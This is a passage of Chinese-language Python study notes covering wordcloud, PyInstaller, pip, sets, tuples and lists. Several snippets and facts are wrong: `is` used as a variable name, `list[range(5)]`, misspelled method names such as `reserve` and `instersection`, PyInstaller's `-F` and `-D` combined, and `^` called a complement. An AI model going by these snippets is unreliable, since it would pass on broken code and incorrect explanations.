<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;Python is a popular programming language&quot;</span></span><br><span class="line"><span class="comment"># 生成词云图</span></span><br><span class="line">wc.generate(text)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>to_file(filename) 方法：使用 <code>to_file(filename)</code> 方法可以将生成的词云图保存到文件中。需要提供保存文件的路径和文件名。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存词云图到文件</span></span><br><span class="line">wc.to_file(<span class="string">&quot;wordcloud.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以上是 <code>wordcloud</code> 库的简单使用示例。通过配置 <code>WordCloud</code> 对象的参数，调用 <code>generate()</code> 方法生成词云图，然后使用 <code>to_file()</code> 方法将词云图保存到文件。</p>
<p>除了上述方法外，<code>wordcloud</code> 还提供了其他一些配置参数，可以控制词云的外观效果，如字体样式、颜色调色板、词云形状等。可以根据需要对 <code>WordCloud</code> 对象进行配置，以生成满足需求的词云图。<br>当使用 <code>wordcloud</code> 库生成词云图时，可以通过配置 <code>WordCloud</code> 对象的参数来控制词云的外观效果。以下是几个常用的配置参数的示例：</p>
<ol>
<li>设置字体样式：可以使用 <code>font_path</code> 参数来指定字体文件的路径，用于设置词云中的字体样式。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 WordCloud 对象，并设置字体样式</span></span><br><span class="line">wc = WordCloud(font_path=<span class="string">&#x27;Arial.ttf&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>设置颜色调色板：可以使用 <code>colormap</code> 参数来指定颜色调色板，用于设置词云中词语的颜色。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 WordCloud 对象，并设置颜色调色板</span></span><br><span class="line">wc = WordCloud(colormap=<span class="string">&#x27;viridis&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>设置词云形状：可以使用 <code>mask</code> 参数来指定词云的形状，可以使用一张图片作为模板。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, ImageColorGenerator</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载词云形状图片</span></span><br><span class="line">mask = np.array(Image.<span class="built_in">open</span>(<span class="string">&#x27;cloud_shape.png&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 WordCloud 对象，并设置词云形状</span></span><br><span class="line">wc = WordCloud(mask=mask)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><code>WordCloud</code> 对象还提供了 <code>background_color</code> 参数来设置词云的背景颜色。可以通过指定颜色名称或十六进制值来设置背景颜色。</li>
</ol>
<p>以下是一个设置词云背景颜色的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 WordCloud 对象，并设置背景颜色为蓝色</span></span><br><span class="line">wc = WordCloud(background_color=<span class="string">&#x27;blue&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在上述示例中，将词云的背景颜色设置为蓝色。根据需要可以使用其他颜色值或颜色名称进行设置。</p>
<p>请注意，背景颜色的设置会影响词云的整体外观，因此选择与词云内容和展示环境相协调的颜色是重要的。根据需求可以灵活调整背景颜色来达到理想的视觉效果。<br>以上示例展示了如何通过配置 <code>WordCloud</code> 对象的参数来控制词云的外观效果。除了上述参数，还可以调整词云的大小、背景颜色、词语权重等，以满足具体需求。</p>
<p>注意，部分参数可能需要额外的依赖库支持，如使用自定义字体样式需要指定字体文件路径，使用词云形状需要加载图片等。根据具体情况进行配置，并通过调试和调整参数来达到理想的词云效果。</p>
<h2 id="5-7-PyInstaller"><a href="#5-7-PyInstaller" class="headerlink" title="5.7 PyInstaller"></a>5.7 PyInstaller</h2><p><code>PyInstaller</code> 是一个用于将 Python 源代码打包成可执行文件的库。它可以将 Python 程序转换为独立的可执行文件，方便在没有 Python 解释器的环境中运行。</p>
<p>下面是 <code>PyInstaller</code> 常用的参数及其功能：</p>
<ol>
<li><p>Python 源程序文件名：指定要打包的 Python 源代码文件的文件名。</p>
</li>
<li><p><code>-F</code> 参数：将程序打包成单个可执行文件。使用该参数可以将所有依赖的库文件和资源文件打包到一个独立的可执行文件中。</p>
</li>
<li><p><code>-i</code> 参数：指定程序图标文件。可以使用 <code>-i</code> 参数来指定一个图标文件，使生成的可执行文件具有自定义图标。</p>
</li>
<li><p><code>-D</code> 参数：将所有依赖的文件打包到一个目录中。使用该参数可以将生成的可执行文件和所有依赖的库文件、资源文件等放在同一个目录中。</p>
</li>
<li><p><code>-clean</code> 参数：在打包之前清理临时文件。使用该参数可以清理 <code>PyInstaller</code> 生成的临时文件和缓存文件，以确保每次打包都是从头开始。</p>
</li>
</ol>
<p>示例命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller myscript.py -F -i icon.ico -D -clean</span><br></pre></td></tr></table></figure>

<p>以上命令将名为 <code>myscript.py</code> 的 Python 源代码文件打包为单个可执行文件，并指定了一个自定义图标文件 <code>icon.ico</code>。生成的可执行文件和依赖的文件将被放置在一个目录中，并在打包之前清理临时文件。</p>
<p>注意，<code>PyInstaller</code> 的参数可以根据具体的需求进行调整和组合，以满足不同的打包需求。请参考 <code>PyInstaller</code> 的官方文档以获取更详细的参数使用说明。</p>
<h2 id="5-9-pip"><a href="#5-9-pip" class="headerlink" title="5.9 pip"></a>5.9 pip</h2><p><code>pip</code> 是 Python 的包管理工具，可以用于安装、升级和管理 Python 包。以下是 <code>pip</code> 的三种安装方式：</p>
<ol>
<li><p>工具安装：使用命令行工具安装包。在命令行中使用 <code>pip install</code> 命令后跟包名，即可自动下载并安装该包。例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install package_name</span><br></pre></td></tr></table></figure>

<p>这将使用默认的 Python 包索引（PyPI）下载并安装指定的包。</p>
</li>
<li><p>自定义安装：通过指定包的下载源或本地文件进行安装。可以使用 <code>-i</code> 参数指定自定义的包索引源，例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://my.package.repository package_name</span><br></pre></td></tr></table></figure>

<p>也可以通过指定本地的包文件进行安装，例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install /path/to/package_file.whl</span><br></pre></td></tr></table></figure>

<p>这种方式适用于需要从非默认源或本地文件进行安装的情况。</p>
</li>
<li><p>文件安装：通过 <code>requirements.txt</code> 文件安装多个包。可以将所有要安装的包及其版本号列在 <code>requirements.txt</code> 文件中，并使用以下命令安装这些包：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p><code>pip</code> 将读取 <code>requirements.txt</code> 文件中的包列表，并自动下载并安装这些包及其依赖项。</p>
</li>
</ol>
<p>这些安装方式使得通过 <code>pip</code> 简便地管理 Python 包，灵活满足项目的需求。根据具体情况选择适当的安装方式，以便有效地管理和使用 Python 包。</p>
<h1 id="第六章-组合数据类型概述"><a href="#第六章-组合数据类型概述" class="headerlink" title="第六章 组合数据类型概述"></a>第六章 组合数据类型概述</h1><p>组合数据类型: 序列类型,集合类型,映射类型<br><img src="https://img-blog.csdnimg.cn/41c92f2561c24be68220cfc63845dfd8.png" alt="在这里插入图片描述"><br>序列类型：是一个元素向量，元素之间存在先后关系，通过序号访问，元素之间不排他。</p>
<p>集合类型：是一个元素集合，元素之间无序，相同元素在集合中唯一存在。</p>
<p>映射类型：是键—值数据项的组合，每个元素是一个键值对，表示为（key，value）</p>
<h2 id="6-1-序列类型"><a href="#6-1-序列类型" class="headerlink" title="6.1 序列类型"></a>6.1 序列类型</h2><ol>
<li>序列类型是一维元素向量，元素之间&#x3D;&#x3D;存在先后关系，通过序号访问&#x3D;&#x3D;</li>
<li>序列中可以&#x3D;&#x3D;存在数值相同但位置不同的元素&#x3D;&#x3D;</li>
<li>序列类型支持成员关系操作符in、长度计算函数len()、分片[]以及元素本身也可以是序列类型</li>
<li>序列类型有str（字符串）、tuple（元组）、list（列表）等。</li>
<li>只要是序列类型，都可以使用相同的索引体系，即&#x3D;&#x3D;正向递增序号和反向递减序号&#x3D;&#x3D;</li>
</ol>
<p>序列类型通用操作符和函数</p>
<table>
<thead>
<tr>
<th>操作符&#x2F;函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>x in s</td>
<td>如果x是s的元素，返回True，否则返回False</td>
</tr>
<tr>
<td>x not in s</td>
<td>如果x不是s的元素，返回True，否则返回False</td>
</tr>
<tr>
<td>s+t</td>
<td>连接s和t</td>
</tr>
<tr>
<td>s_n或n_s</td>
<td>将序列s复制n次</td>
</tr>
<tr>
<td>s[i]</td>
<td>索引，返回序列的第i个元素</td>
</tr>
<tr>
<td>s[i:j]</td>
<td>分片，返回包含序列s的第i到j个元素的子序列（不包含j，左闭右开）</td>
</tr>
<tr>
<td>s[i:j:k]</td>
<td>步骤分片，返回包含序列s的第i到第j个元素以k为步数的子序列</td>
</tr>
<tr>
<td>len(s)</td>
<td>序列s的元素个数（长度）</td>
</tr>
<tr>
<td>min(s)</td>
<td>序列s中的最小元素</td>
</tr>
<tr>
<td>max(s)</td>
<td>序列s中的最大元素</td>
</tr>
<tr>
<td>s.index(x[,i[,j]])</td>
<td>序列s中从i开始到j位置中第一次出现元素x的位置</td>
</tr>
<tr>
<td>s.count(x)</td>
<td>序列s中出现x的总次数</td>
</tr>
</tbody></table>
<h2 id="6-2-集合序列"><a href="#6-2-集合序列" class="headerlink" title="6.2 集合序列"></a>6.2 集合序列</h2><ol>
<li>包含0个或多个数据项的&#x3D;&#x3D;无序组合&#x3D;&#x3D;,&#x3D;&#x3D;不可索引,无位置概念,分片&#x3D;&#x3D;,&#x3D;&#x3D;元素不可重复&#x3D;&#x3D;，元素类型只能是固定数据类型，例如整数、浮点数、字符串以及元组等。&#x3D;&#x3D;列表、字典以及集合类型本身都是可变数据类型，不能作为集合元素出现&#x3D;&#x3D;，能够进行哈希运算的类型都可以作为集合的元素</li>
<li>hash() 哈希运算函数,对数据类型生成一个哈希值</li>
<li>可以动态增加或删除</li>
<li>&#x3D;&#x3D;打印效果与定义顺序不一定一致&#x3D;&#x3D;,其元素唯一性,可用于 &#x3D;&#x3D;过滤重复元素&#x3D;&#x3D;</li>
<li>集合用大括号{}表示, &#x3D;&#x3D;set(x)可用于生成集合&#x3D;&#x3D;</li>
<li>&#x3D;&#x3D;直接使用{}无法生成集合,生成的是空字典&#x3D;&#x3D;</li>
<li>集合四种基本操作 交集(&amp;),并集(|),差集(-),补集(^)</li>
<li>集合主要用于 成员关系测试,元素去重,删除数据项</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; A = &#123;&quot;python&quot;, 123, (&quot;python&quot;, 123)&#125; </span><br><span class="line">&gt;&gt;&gt; print(A);</span><br><span class="line">&#123;123, &#x27;python&#x27;, (&#x27;python&#x27;, 123)&#125;</span><br><span class="line">&gt;&gt;&gt; B = set(&quot;pypy123&quot;); #使用set建立集合</span><br><span class="line">&gt;&gt;&gt; print(B);</span><br><span class="line">&#123;&#x27;y&#x27;, &#x27;3&#x27;, &#x27;p&#x27;, &#x27;2&#x27;, &#x27;1&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; C = &#123;&quot;python&quot;, 123, &quot;python&quot;, 123&#125;;</span><br><span class="line">&gt;&gt;&gt; print(C);</span><br><span class="line">&#123;123, &#x27;python&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>集合类型的操作符</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>S - T 或s.difference(T)</td>
<td>差，返回一个新集合，包括在集合S但不在T中的元素</td>
</tr>
<tr>
<td>S -&#x3D; T 或s.difference_updata(T)</td>
<td>差，更新集合S,包括在集合S但不在T中的元素</td>
</tr>
<tr>
<td>S &amp; T 或 s.instersection(T)</td>
<td>交，返回一个新集合，包括同时在集合S和T中的元素</td>
</tr>
<tr>
<td>S &amp;&#x3D; T 或s.instersection_updata(T)</td>
<td>交，更新集合S,包括同时在集合S和T中的元素</td>
</tr>
<tr>
<td>S ^ T 或symmetric_difference(T)</td>
<td>补，返回一个新集合，包括集合S和T中的非相同元素</td>
</tr>
<tr>
<td>S ^&#x3D; T 或symmetric_difference(T)</td>
<td>补，更新集合S,包括集合S和T中非相同的元素</td>
</tr>
<tr>
<td>S | T或s.union(T)</td>
<td>并，返回一个新集合，包括在集合S和T中所有的元素</td>
</tr>
<tr>
<td>S |&#x3D; T 或s.upadate(T)</td>
<td>并，更新集合S,包括在集合S和T中所有的元素</td>
</tr>
<tr>
<td>S &lt;&#x3D; T 或 S &lt; T或s…issubset(T)</td>
<td>返回True或False,判断S和T的子集关系,前者s与T相同或是T的子集,返回True,后者可用于判断s是否为T的真子集</td>
</tr>
<tr>
<td>S &gt;&#x3D; T 或 S &gt; T 或s.issuperset(T)</td>
<td>返回True或False,判断S和T的包含关系,前者s与T相同或是T的超集,返回True,后者可用于判断s是否为T的真超集</td>
</tr>
</tbody></table>
<p>集合类型的操作函数或方法</p>
<table>
<thead>
<tr>
<th>操作函数或方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>S.add(x)</td>
<td>如果x不在集合S中，将x增加到S</td>
</tr>
<tr>
<td>S.discard(x)</td>
<td>移除S中元素x,如果x不在集合S中，不报错</td>
</tr>
<tr>
<td>S.remove(x)</td>
<td>移除S中元素x,如果x不在集合S中，产生KeyError异常</td>
</tr>
<tr>
<td>S.clear()</td>
<td>移除S中所有元素</td>
</tr>
<tr>
<td>S.pop()</td>
<td>随机返回S的一个元素，更新S,若S为空产生KeyError异常</td>
</tr>
<tr>
<td>S.copy()</td>
<td>返回集合S的一个副本</td>
</tr>
<tr>
<td>len(S)</td>
<td>返回集合S的元素个数</td>
</tr>
<tr>
<td>x in S</td>
<td>判断S中元素x,x在集合S中，返回True,否则返回False</td>
</tr>
<tr>
<td>x not in S</td>
<td>判断S中元素x,x不在集合S中，返回True,否则返回False</td>
</tr>
<tr>
<td>set(x)</td>
<td>将其他类型变量x转变为集合类型</td>
</tr>
</tbody></table>
<h2 id="6-3映射类型"><a href="#6-3映射类型" class="headerlink" title="6.3映射类型"></a>6.3映射类型</h2><p>映射类型是“键—值”的数据项的组合，每个元素是一个键值对，即元素是（key，value），元素之间是无序的，键值对（key，value）是一种二元关系。<br>键和值通过冒号连接，不同键值对通过逗号隔开。主要是以字典(dist)体现,字典是集合类型的延续，所以各个元素并没有顺序之分。键和值可以是任意数据类型，包括程序自定义的类型。</p>
<h2 id="6-1-1-元组概述"><a href="#6-1-1-元组概述" class="headerlink" title="6.1.1 元组概述"></a>6.1.1 元组概述</h2><ol>
<li>元组tuple是包含0个或多个数据项的&#x3D;&#x3D;不可变序列类型&#x3D;&#x3D;,因为它&#x3D;&#x3D;一旦创建就不能被修改&#x3D;&#x3D;，并且元组生成后&#x3D;&#x3D;固定的，其中的任何数据项不可替换或者删除&#x3D;&#x3D;，尽管元组本身是不可变的，但是如果元组中包含可变的数据类型（如列表或字典），那么这些元素的内容是可以被修改的。</li>
<li>元组类型在表达固定数据项、函数多返回值、多变量同步赋值、循环遍历等情况下十便利。</li>
<li>Python中元组采用逗号和圆括号来表示。</li>
<li>只有一个元素时：num&#x3D;(1,)</li>
<li>&#x3D;&#x3D;生成元组只需要使用逗号将元素隔离开即可&#x3D;&#x3D;。也可以增加圆括号，但圆括号在不混淆语义的情况下不是必须的。</li>
<li>一个元组可以作为另一个元组的元素，并且可以采用多级索引来获取信息。</li>
<li>&#x3D;&#x3D;也可以使用 tuple() 构造函数来创建元组&#x3D;&#x3D;：tuple([1,2,3]),只能传入一个参数，list也是</li>
<li>元素可以是不同类型，任何类型</li>
</ol>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>cmp(tuple1, tuple2)</td>
<td>比较两个元组元素。</td>
</tr>
<tr>
<td>tuple(seq)</td>
<td>将列表转换为元组。</td>
</tr>
<tr>
<td>cmp被operator取代</td>
<td>详细如下。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import operator          #首先要导入运算符模块</span><br><span class="line"></span><br><span class="line">operator.gt(x,y)          #意思是x greater than（大于）y</span><br><span class="line"></span><br><span class="line">operator.ge(x,y)         #意思是x greater and equal（大于等于）y</span><br><span class="line"></span><br><span class="line">operator.eq(x,y)         #意思是x equal（等于）y</span><br><span class="line"></span><br><span class="line">operator.le(x,y)          #意思是x less and equal（小于等于）y</span><br><span class="line"></span><br><span class="line">operator.lt(x,y)           #意思是x less than（小于）y</span><br></pre></td></tr></table></figure>

<p>元组tuple是包含0个或多个数据项的&#x3D;&#x3D;不可变序列类型&#x3D;&#x3D;，并且元组生成后<br>&#x3D;&#x3D;固定的，其中的任何数据项不可替换或者删除&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;print( &#x27;abc&#x27;, -4.24e93, 18+6.6j, &#x27;xyz&#x27;)</span><br><span class="line">&gt;&gt;&gt;x, y = 1, 2</span><br><span class="line">&gt;&gt;&gt;print( &quot;Value of x , y : &quot;, x,y)</span><br><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure>
<p>尽管元组本身是不可变的，但是如果元组中包含可变的数据类型（如列表或字典），那么这些元素的&#x3D;&#x3D;内容是可以被修改&#x3D;&#x3D;的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b=[1,2,3]</span><br><span class="line">a=tuple([1,2,b])</span><br><span class="line">a</span><br><span class="line">b[2]=1</span><br><span class="line">a</span><br><span class="line">output：</span><br><span class="line">a:(1,2,[1,2,3])</span><br><span class="line">a:(1,2,[1,2,1])</span><br></pre></td></tr></table></figure>
<p>尽管这样可以“改变”元组，但这并不意味着元组本身变了。元组中的第三个元素在这个过程中仍然是同一个列表对象，只是列表的内容发生了改变。在Python解释器看来，元组的不可变性并未被破坏，因为元组中的元素（也就是对象的标识符）没有改变。</p>
<h2 id="6-1-2-列表概述"><a href="#6-1-2-列表概述" class="headerlink" title="6.1.2 列表概述"></a>6.1.2 列表概述</h2><ol>
<li>&#x3D;&#x3D;是一种有序和长度内容可更改。允许重复的成员。没有长度限制&#x3D;&#x3D;</li>
<li>列表也支持成员关系操作符in、长度len（）以及分片[]等操作。</li>
<li>列表可以同时使用正向递增序号何反向递减序号，也可以采用标准的比较操作符（&lt;&#x3D;&#x2F;&#x3D;&#x3D;&#x2F;!&#x3D;&#x2F;&gt;&#x3D;&#x2F;&gt;）进行比较，列表比较其实是单个数据项的逐个比较。</li>
<li>列表用中括号[]表示，也可以通&#x3D;&#x3D;过list（）函数将元组或字符串转化成列表。直接使用list（）函会返回一个空列表。&#x3D;&#x3D;</li>
<li>简单将一个列表赋值给另一个列表不会生成新列表对象<br> 因为：list2 将只是对 list1 的引用，list1 中所做的更改也将自动在 list2 中进行。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;is=[1,&quot;b&quot;,1]</span><br><span class="line">&gt;&gt;&gt;it=is #it只是对is的引用,it不包括真实数据,修改is同时也会修改it</span><br><span class="line">&gt;&gt;&gt;is[0]=0</span><br><span class="line">&gt;&gt;&gt;print(it)</span><br><span class="line">[0,&quot;b&quot;,1]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="keyword">for</span> a,b,c <span class="keyword">in</span> num:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a=&#123;&#125;,b=&#123;&#125;,c=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a,b,c)) </span><br><span class="line"><span class="comment">#a=1,b=2,c=3</span></span><br><span class="line"><span class="comment">#a=2,b=3,c=4</span></span><br><span class="line"></span><br><span class="line">num=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">a,*other=num</span><br><span class="line"><span class="built_in">print</span>(a,other)<span class="comment">#1 [2, 3, 4]</span></span><br></pre></td></tr></table></figure>
<p>列表类型特有的函数和方法</p>
<table>
<thead>
<tr>
<th>函数&#x2F;方法</th>
<th>描绘</th>
</tr>
</thead>
<tbody><tr>
<td>list(seq)</td>
<td>将元组转换为列表</td>
</tr>
<tr>
<td>ls[i]&#x3D;x</td>
<td>替换列表ls第i项数据为x</td>
</tr>
<tr>
<td>ls[i:j]&#x3D;lt</td>
<td>列表lt替换列表ls中第i到第j项数据（不包含第j项，下同）</td>
</tr>
<tr>
<td>ls[i:j:k]&#x3D;lt</td>
<td>用列表lt替换列表ls中第i到第j项以k为步长的数据</td>
</tr>
<tr>
<td>del ls[i:j]</td>
<td>删除列表ls第i到第j项数据。等价于ls[i:j]&#x3D;[]</td>
</tr>
<tr>
<td>del ls[i:j:k]</td>
<td>删除列表ls第i到第j项以k为步长的数据</td>
</tr>
<tr>
<td>ls+&#x3D;lt或ls.extend(lt)</td>
<td>将列表lt元素增加到列表ls中</td>
</tr>
<tr>
<td>ls*&#x3D;n</td>
<td>更新列表ls，其元素重复n次</td>
</tr>
<tr>
<td>ls.append(x)</td>
<td>在列表ls最后增加一个元素x</td>
</tr>
<tr>
<td>ls.clear()</td>
<td>删除ls中所有的元素</td>
</tr>
<tr>
<td>ls.copy()</td>
<td>生成一个新列表，复制ls中的所有元素</td>
</tr>
<tr>
<td>ls.insert(i,x)</td>
<td>在列表第i的位置新增插入元素x</td>
</tr>
<tr>
<td>ls.pop(i)</td>
<td>将列表ls中第i项元素取出并删除该元素</td>
</tr>
<tr>
<td>ls.remove(x)</td>
<td>将列表ls中出现的第一个元素x删除</td>
</tr>
<tr>
<td>ls.reserve()</td>
<td>列表ls中的元素反转</td>
</tr>
</tbody></table>
<p>在Python中，<code>extend</code>和<code>append</code>都是列表对象的方法，用于向列表添加元素，但是它们的工作方式是不同的。</p>
<ol>
<li><p><code>extend(iterable)</code>: 该方法会将给定的可迭代对象中的每个元素添加到列表的末尾。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">list1.extend(<span class="string">&#x27;de&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)  <span class="comment"># 输出：[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，字符串<code>&#39;de&#39;</code>被视为一个可迭代对象，因此它的每个字符都被添加到了列表的末尾。</p>
</li>
<li><p><code>append(object)</code>: 该方法会将给定的对象作为一个整体添加到列表的末尾。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;de&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)  <span class="comment"># 输出：[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;de&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，字符串<code>&#39;de&#39;</code>被视为一个单独的对象，因此它被作为一个整体添加到了列表的末尾。</p>
</li>
</ol>
<p>简而言之，<code>extend</code>方法会把一个可迭代对象的每个元素都添加到列表中，而<code>append</code>方法会把整个对象作为一个元素添加到列表中。</p>
<p>当使用一个列表改变另一个列表时，Python不要求两个列表长度一样，但遵循“多增少减”的原则</p>
<p>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;vlist=list[range(5)]</span><br><span class="line">&gt;&gt;&gt;vlist[1:3] = [&quot;new&quot;,&quot;bit&quot;,1]</span><br><span class="line">&gt;&gt;&gt;vlist</span><br><span class="line">[0,&quot;new&quot;,&quot;bit&quot;,1,3,4]</span><br><span class="line">&gt;&gt;&gt;vlist[1:3]=[&quot;fewer&quot;]</span><br><span class="line">&gt;&gt;&gt;vilst</span><br><span class="line">[0,&quot;fewer&quot;,1,3,4]</span><br><span class="line">&gt;&gt;&gt;list1=[1,2,3]</span><br><span class="line">&gt;&gt;&gt;list1[0:2]=&#x27;a&#x27;</span><br><span class="line">[&#x27;a&#x27;,3]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#检查列表中是否存在 “apple”：</span><br><span class="line">thislist = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">if &quot;apple&quot; in thislist:print(&quot;Yes, &#x27;apple&#x27; is in the fruits list&quot;)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>对于可变类型，可以直接在函数中修改其值（不用声明全局变量），但注意，是修改其值而不是直接改变其引用对象，当尝试不声明全局变量直接赋值时则会创建一个新的局部变量<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">img1 = [<span class="number">12</span>,<span class="number">34</span>,<span class="number">56</span>,<span class="number">78</span>]</span><br><span class="line">img2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">displ</span>():</span><br><span class="line">    <span class="built_in">print</span>(img1)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modi</span>():</span><br><span class="line">    <span class="comment"># img1.append(22)</span></span><br><span class="line">    img1=img2</span><br><span class="line">modi()</span><br><span class="line">displ()</span><br><span class="line">out：</span><br><span class="line">[<span class="number">12</span>, <span class="number">34</span>, <span class="number">56</span>, <span class="number">78</span>]</span><br></pre></td></tr></table></figure>
